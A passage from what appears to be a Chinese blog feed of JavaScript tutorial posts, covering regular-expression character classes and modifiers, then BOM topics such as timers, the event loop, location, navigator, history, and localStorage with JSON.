class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg3.<span class="title function_">test</span>(<span class="string">&#x27;B&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg3.<span class="title function_">test</span>(<span class="string">&#x27;b&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg3.<span class="title function_">test</span>(<span class="number">9</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg3.<span class="title function_">test</span>(<span class="string">&#x27;,&#x27;</span>))  <span class="comment">// flase</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 用户名可以输入英文字母，数字，可以加下划线，要求 6~16位</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg4 = <span class="regexp">/^[a-zA-Z0-9_]&#123;6,16&#125;$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;abcd1&#x27;</span>))  <span class="comment">// false </span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;abcd12&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;ABcd12&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg4.<span class="title function_">test</span>(<span class="string">&#x27;ABcd12_&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3. [^a-z] 取反符</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> reg5 = <span class="regexp">/^[^a-z]$/</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg5.<span class="title function_">test</span>(<span class="string">&#x27;a&#x27;</span>))  <span class="comment">// false </span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg5.<span class="title function_">test</span>(<span class="string">&#x27;A&#x27;</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg5.<span class="title function_">test</span>(<span class="number">8</span>))  <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><p>常见模式的简写方式</p><table><thead><tr><th>预定类</th><th>说明</th></tr></thead><tbody><tr><td>\d</td><td>匹配0-9之间的任意数字，相当于[0-9]</td></tr><tr><td>\D</td><td>匹配所以0-9以外的字符，相当于[^0-9]</td></tr><tr><td>\w</td><td>匹配任意的字母、数字和下划线，相当于[A-Za-z0-9_]</td></tr><tr><td>\W</td><td>除所以字母、数字和下划线以外的字符，相当于[^A-Za-z0-9_]</td></tr><tr><td>\s</td><td>匹配空格（包括换行符、制表符、空格符等），相当于[\t\r\n\v\f]</td></tr><tr><td>\S</td><td>匹配非空格的字符，相当于[^\t\r\n\v\f]</td></tr></tbody></table><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">日期格式：^\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="替换和修饰符"><a href="#替换和修饰符" class="headerlink" title="替换和修饰符"></a>替换和修饰符</h2><p><code>replace()</code> 替换方法，可以完成字符的替换</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> str = <span class="string">&#x27;认真学习前端，相信一定能学好前端&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 替换  replace  需求：把前端替换为 web</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// replace 返回值是替换完毕的字符串</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> strEnd = str.<span class="title function_">replace</span>(<span class="regexp">/前端/</span>, <span class="string">&#x27;web&#x27;</span>) <span class="comment">// 只能替换一个</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>修饰符</strong>约束正则执行的某些细节行为，如是否区分大小写、是否支持多行匹配等</p><ul><li>i 是单词 ignore 的缩写，正则匹配时字母不区分大小写</li><li>g 是单词 global 的缩写，匹配所有满足正则表达式的结果</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> str = <span class="string">&#x27;认真学习前端，相信一定能学好前端&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 修饰符 g 全部替换</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> strEnd = str.<span class="title function_">replace</span>(<span class="regexp">/前端/g</span>, <span class="string">&#x27;web&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(strEnd) </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-BOM操作</title>
      <link href="/2024/02/02/JavaScript-BOM%E6%93%8D%E4%BD%9C/"/>
      <url>/2024/02/02/JavaScript-BOM%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript组成"><a href="#JavaScript组成" class="headerlink" title="JavaScript组成"></a>JavaScript组成</h1><ul><li><p>ECMAScript:</p><ul><li>规定了js基础语法核心知识。</li><li>比如：变量、分支语句、循环语句、对象等等</li></ul></li><li><p>Web APIs :</p><ul><li>DOM 文档对象模型， 定义了一套操作HTML文档的API</li><li>BOM 浏览器对象模型，定义了一套操作浏览器窗口的API</li></ul></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240128150153.png"></p><h1 id="Window对象"><a href="#Window对象" class="headerlink" title="Window对象"></a>Window对象</h1><p><strong>BOM</strong> (Browser Object Model ) 是浏览器对象模型</p><ul><li><code>window对象</code>是一个全局对象，也可以说是JavaScript中的顶级对象</li><li>像<code>document</code>、<code>alert()</code>、<code>console.log()</code>这些都是window的属性，基本BOM的属性和方法都是window的</li><li>所有通过var定义在全局作用域中的变量、函数都会变成window对象的属性和方法</li><li>window对象下的属性和方法调用的时候<strong>可以省略window</strong></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1676047436362.png" alt="1676047436362.png"></p><h1 id="定时器-延迟函数"><a href="#定时器-延迟函数" class="headerlink" title="定时器-延迟函数"></a>定时器-延迟函数</h1><p>JavaScript 内置的一个用来让代码延迟执行的函数，叫 <code>setTimeout</code></p><p><strong>语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(回调函数, 延迟时间)</span><br></pre></td></tr></table></figure><p><code>setTimeout</code> 仅仅只执行一次，所以可以理解为就是把一段代码延迟执行, 平时省略window</p><p><strong>清除延时函数</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(回调函数, 延迟时间)</span><br><span class="line"><span class="built_in">clearTimeout</span>(timerId)</span><br></pre></td></tr></table></figure><p>注意点：</p><ol><li>延时函数需要等待,所以后面的代码先执行</li><li>返回值是一个正整数，表示定时器的编号</li><li>每次调用延时器都会产生一个新的延时器</li></ol><p>对比间歇函数 <code>setInterval</code> : 每隔一段时间就执行一次， , 平时省略window</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 定时器之延迟函数</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 开启延迟函数</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我只执行一次&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;, <span class="number">3000</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1.1 延迟函数返回的还是一个正整数数字，表示延迟函数的编号</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(timerId)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1.2 延迟函数需要等待时间，所以下面的代码优先执行</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 关闭延迟函数</span></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">clearTimeout</span>(timerId)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="JS执行机制"><a href="#JS执行机制" class="headerlink" title="JS执行机制"></a>JS执行机制</h1><p>JavaScript语言是单线程，如果执行时间过长就会造成渲染不连贯</p><p><strong>同步任务：</strong></p><ul><li>同步任务都在主线程上执行，形成一个<strong>执行栈</strong>。</li></ul><p><strong>异步任务</strong>：</p><ul><li>JS的异步是通过回调函数实现的。</li><li>一般而已，异步任务有以下三种类型：<ol><li>普通事件，如<code>click</code>、<code>resize</code>等</li><li>资源加载，如<code>load</code>、<code>error</code>等</li><li>定时器，包括<code>setInterval</code>、<code>setTimeout</code>等</li></ol></li><li>异步任务相关添加到<strong>任务队列</strong>中（也称为消息队列）</li></ul><ol><li>先执行执行栈中的同步任务。 </li><li>异步任务放入任务队列中。 </li><li>一旦执行栈中的所有同步任务执行完毕，系统就会按次序读取任务队列中的异步任务，于是被读取的异步任务结束等待 状态，进入执行栈，开始执行。</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240202221058.png" alt="image.png"></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240202221222.png" alt="image.png"></p><ul><li>由于主线程不断的重复获取任务、执行任务、再获取任务、再执行任务，所以这种机制被称为<strong>事件循环（event loop）</strong></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240202221416.png" alt="image.png"></p><h1 id="location对象"><a href="#location对象" class="headerlink" title="location对象"></a>location对象</h1><p>location (地址) 它拆分并保存了 URL 地址的各个组成部分， 它是一个对象</p><table><thead><tr><th>属性&#x2F;方法</th><th>说明</th></tr></thead><tbody><tr><td>href</td><td>属性，获取完整的 URL 地址，赋值时用于地址的跳转</td></tr><tr><td>search</td><td>属性，获取地址中携带的参数，符号 ？后面部分</td></tr><tr><td>hash</td><td>属性，获取地址中的啥希值，符号 # 后面部分</td></tr><tr><td>reload()</td><td>方法，用来刷新当前页面，传入参数 true 时表示强制刷新</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#/music&quot;</span>&gt;</span>音乐<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#/download&quot;</span>&gt;</span>下载<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;reload&quot;</span>&gt;</span>刷新页面<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// location 对象  </span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. href属性 （重点） 得到完整地址，赋值则是跳转到新地址</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">href</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// location.href = &#x27;http://www.bilibili.com&#x27;  可以通过js方式跳转到目标地址</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. search属性  得到 ? 后面的地址 </span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">search</span>)  <span class="comment">// ?search=笔记本</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3. hash属性  得到 # 后面的地址</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hash</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 4. reload 方法  刷新页面</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.reload&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// location.reload() // 页面刷新</span></span></span><br><span class="line"><span class="language-javascript">location.<span class="title function_">reload</span>(<span class="literal">true</span>) <span class="comment">// 强制页面刷新 ctrl+f5</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="navigator对象"><a href="#navigator对象" class="headerlink" title="navigator对象"></a>navigator对象</h1><p>navigator是对象，该对象下记录了浏览器自身的相关信息</p><p>常用属性和方法：</p><ul><li>通过 userAgent 检测浏览器的版本及平台</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测 userAgent（浏览器信息）</span></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> userAgent = navigator.<span class="property">userAgent</span></span><br><span class="line"><span class="comment">// 验证是否为Android或iPhone</span></span><br><span class="line"><span class="keyword">const</span> android = userAgent.<span class="title function_">match</span>(<span class="regexp">/(Android);?[\s\/]+([\d.]+)?/</span>)</span><br><span class="line"><span class="keyword">const</span> iphone = userAgent.<span class="title function_">match</span>(<span class="regexp">/(iPhone\sOS)\s([\d_]+)/</span>)</span><br><span class="line"><span class="comment">// 如果是Android或iPhone，则跳转至移动站点</span></span><br><span class="line"><span class="keyword">if</span> (android || iphone) &#123;</span><br><span class="line">location.<span class="property">href</span> = <span class="string">&#x27;http://m.itcast.cn&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h1 id="history对象"><a href="#history对象" class="headerlink" title="history对象"></a>history对象</h1><p>history的数据类型是对象，主要管理历史记录， 该对象与浏览器地址栏的操作相对应，如前进、后退等</p><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>back()</td><td>可以后退功能</td></tr><tr><td>forward()</td><td>前进功能</td></tr><tr><td>go(参数)</td><td>前进后退功能，参数为1表示前进一个页面，为-1表示后退一个页面</td></tr></tbody></table><h1 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h1><p>随着互联网的快速发展，基于网页的应用越来越普遍，同时也变的越来越复杂，为了满足各种各样的需求，会经常性在本地存储大量的数据，HTML5规范提出了相关解决方案。</p><ol><li>数据存储在用户浏览器中</li><li>设置、读取方便、甚至页面刷新不丢失数据</li><li>容量较大，<code>sessionStorage</code>和<code>localStorage</code>约 5M 左右</li></ol><h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><p><strong>作用</strong>：数据可以长期保留在本地浏览器中，刷新页面和关闭页面，数据也不会丢失，除非手动删除</p><p><strong>特性</strong>：</p><ul><li>以键值对的形式存储，并且存储的是字符串， 省略了window</li><li>可以多窗口页面共享（同一浏览器）</li></ul><p><strong>语法</strong>：</p><ul><li>存储数据：<code>localStorage.setItem(key, value)</code></li><li>获取数据：<code>localStorage.getItem(key)</code></li><li>删除数据：<code>localStorage.removeItem(key)</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>本地存储-localstorage<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 本地存储 - localstorage 存储的是字符串 </span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 存储</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 获取</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;age&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3. 删除</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;age&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240203152703.png" alt="image.png"></p><h2 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h2><p><strong>特性</strong>：</p><ul><li>生命周期为关闭浏览器窗口</li><li>在同一个窗口(页面)下数据可以共享</li><li>以键值对的形式存储使用</li><li>用法跟<code>localStorage</code>基本相同</li></ul><p><strong>区别</strong>：</p><ul><li>用法跟<code>localStorage</code>基本相同</li><li>当页面浏览器被关闭时，存储在 sessionStorage 的数据会被清除</li></ul><p><strong>语法</strong>：</p><ul><li>存储：<code>sessionStorage.setItem(key,value)</code></li><li>获取：<code>sessionStorage.getItem(key)</code></li><li>删除：<code>sessionStorage.removeItem(key)</code></li></ul><h2 id="存储复杂数据类型"><a href="#存储复杂数据类型" class="headerlink" title="存储复杂数据类型"></a>存储复杂数据类型</h2><p><strong>问题</strong>：本地只能存储字符串,无法存储复杂数据类型.</p><p><strong>解决</strong>：需要将复杂数据类型转换成 JSON字符串,在存储到本地</p><p><strong>语法</strong>：<code>JSON.stringify(复杂数据类型)</code></p><p>JSON字符串：</p><ul><li>首先是1个字符串</li><li>属性名使用双引号引起来，不能单引号</li><li>属性值如果是字符串型也必须双引号</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 本地存储复杂数据类型</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> goods = &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>: <span class="string">&#x27;小米&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">price</span>: <span class="number">1999</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 把对象转换为JSON字符串  JSON.stringify</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;goods&#x27;</span>, goods)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;goods1&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(goods))</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240203154119.png" alt="image.png"></p><p><strong>问题</strong>：因为本地存储里面取出来的是字符串，不是对象，无法直接使用</p><p><strong>解决</strong>： 把取出来的字符串转换为对象</p><p><strong>语法</strong>：<code>JSON.parse(JSON字符串)</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 本地存储复杂数据类型</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> goods = &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>: <span class="string">&#x27;小米&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">price</span>: <span class="number">1999</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 把对象转换为JSON字符串  JSON.stringify</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;goods&#x27;</span>, goods)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;goods1&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(goods))</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 把JSON字符串转换为对象  JSON.parse</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;goods1&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;goods1&#x27;</span>)))</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240203154138.png" alt="image.png"></p><h1 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h1><h2 id="数组map方法"><a href="#数组map方法" class="headerlink" title="数组map方法"></a>数组map方法</h2><p><strong>使用场景：</strong></p><p><code>map()</code> 可以遍历数组处理数据，并且返回新的数组</p><p><strong>语法：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 